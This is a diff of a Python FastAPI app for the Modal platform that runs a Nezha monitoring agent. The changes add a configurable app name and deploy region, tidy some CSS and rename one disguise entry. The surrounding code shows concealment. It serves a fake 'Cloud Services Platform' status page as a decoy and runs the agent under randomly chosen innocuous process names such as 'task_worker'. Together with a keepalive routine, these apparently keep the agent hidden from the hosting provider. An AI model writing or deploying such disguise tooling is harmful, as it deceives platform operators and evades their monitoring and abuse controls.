@@ -6,8 +6,12 @@ import platform
 import random
 import threading
 from fastapi import FastAPI, Response, Request
-from fastapi.responses import HTMLResponse, PlainTextResponse
+from fastapi.responses import HTMLResponse
 import modal
+
+# ========== Modal 配置 ==========
+MODAL_APP_NAME = os.environ.get('MODAL_APP_NAME') or "nezha-fastapi-app"
+DEPLOY_REGION = os.environ.get('DEPLOY_REGION') or "us-east"
 
 # ========== Modal 镜像定义 ==========
 image = modal.Image.debian_slim().pip_install(
@@ -18,7 +22,7 @@ image = modal.Image.debian_slim().pip_install(
     "uvicorn",
 )
 
-app = modal.App("nezha-fastapi-app", image=image)
+app = modal.App(MODAL_APP_NAME, image=image)
 
 # ========== FastAPI 实例 ==========
 web_app = FastAPI(
@@ -97,10 +101,7 @@ FAKE_HTML = """<!DOCTYPE html>
             padding: 20px 16px;
             text-align: center;
         }
-        .status-card .icon {
-            font-size: 28px;
-            margin-bottom: 8px;
-        }
+        .status-card .icon { font-size: 28px; margin-bottom: 8px; }
         .status-card .label {
             font-size: 12px;
             color: #94a3b8;
@@ -141,26 +142,14 @@ FAKE_HTML = """<!DOCTYPE html>
             font-size: 13px;
             line-height: 1.8;
         }
-        .footer a {
-            color: #667eea;
-            text-decoration: none;
-        }
-        .footer a:hover { text-decoration: underline; }
-        .divider {
-            height: 1px;
-            background: #e5e7eb;
-            margin: 24px 0;
-        }
+        .divider { height: 1px; background: #e5e7eb; margin: 24px 0; }
         .tech-stack {
             display: flex;
             justify-content: center;
             gap: 24px;
             margin-top: 16px;
         }
-        .tech-item {
-            font-size: 12px;
-            color: #9ca3af;
-        }
+        .tech-item { font-size: 12px; color: #9ca3af; }
     </style>
 </head>
 <body>
@@ -170,15 +159,12 @@ FAKE_HTML = """<!DOCTYPE html>
                 <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/>
             </svg>
         </div>
-
         <h1>Cloud Services Platform</h1>
         <p class="subtitle">Enterprise-grade cloud infrastructure powering your applications with high availability and global reach.</p>
-
         <div class="status-badge">
             <span class="dot"></span>
             All Systems Operational
         </div>
-
         <div class="status-grid">
             <div class="status-card">
                 <div class="icon">⚡</div>
@@ -201,9 +187,7 @@ FAKE_HTML = """<!DOCTYPE html>
                 <div class="value">&lt;50ms</div>
             </div>
         </div>
-
         <div class="divider"></div>
-
         <div class="footer">
             <p>&copy; 2025 Cloud Services Platform. All rights reserved.</p>
             <p>Powered by distributed cloud architecture</p>
@@ -306,7 +290,7 @@ def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
         'session_handler',
         'task_worker',
         'log_rotator',
-        'health_check',
+        'health_monitor',
     ]
     disguise_name = random.choice(disguise_names)
     print(f"Using disguise name: {disguise_name}")
@@ -430,7 +414,7 @@ def find_agent_processes():
         'session_handler',
         'task_worker',
         'log_rotator',
-        'health_check',
+        'health_monitor',
     ]
     found = []
     for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
@@ -471,7 +455,6 @@ def auto_detect_url(request: Request):
         msg = f"Auto-detected PROJECT_URL: {_project_url}"
         print(msg)
         write_log(msg)
-
         start_keepalive()
 
 
@@ -564,6 +547,7 @@ def ensure_agent_started():
 
     print("=" * 50)
     print("Initializing Nezha Agent...")
+    print(f"Deploy Region: {DEPLOY_REGION}")
     print("=" * 50)
 
     FILE_PATH = os.environ.get('FILE_PATH', '.cache')
@@ -580,6 +564,7 @@ def ensure_agent_started():
 
     write_log("=" * 40)
     write_log("Agent initialization started")
+    write_log(f"Deploy Region: {DEPLOY_REGION}")
     write_log(f"FILE_PATH: {FILE_PATH}")
     write_log(f"NEZHA_SERVER: {NEZHA_SERVER}")
     write_log(f"NEZHA_PORT: {NEZHA_PORT}")
@@ -640,7 +625,6 @@ async def health():
 @web_app.get("/status")
 async def status():
     processes = find_agent_processes()
-
     if processes:
         data = {
             "agent_status": "running",
@@ -654,7 +638,6 @@ async def status():
             "process_count": 0,
             "recent_logs": tail_log('/tmp/agent.log', lines=5),
         }
-
     return Response(
         content=json.dumps(data),
         media_type="application/json",
@@ -681,6 +664,7 @@ async def info():
         "platform": platform.platform(),
         "architecture": platform.machine(),
         "python_version": platform.python_version(),
+        "deploy_region": DEPLOY_REGION,
         "cpu_count": psutil.cpu_count(),
         "memory_total_mb": round(psutil.virtual_memory().total / 1024 / 1024, 2),
         "memory_used_mb": round(psutil.virtual_memory().used / 1024 / 1024, 2),
@@ -750,12 +734,13 @@ async def restart_agent():
     )
 
 
-# ========== Modal 入口 ==========
+# ========== Modal 入口（带区域部署） ==========
 
 @app.function(
     secrets=[modal.Secret.from_name("nezha-secrets")],
     allow_concurrent_inputs=10,
     container_idle_timeout=300,
+    region=DEPLOY_REGION,
 )
 @modal.asgi_app()
 def fastapi_app():
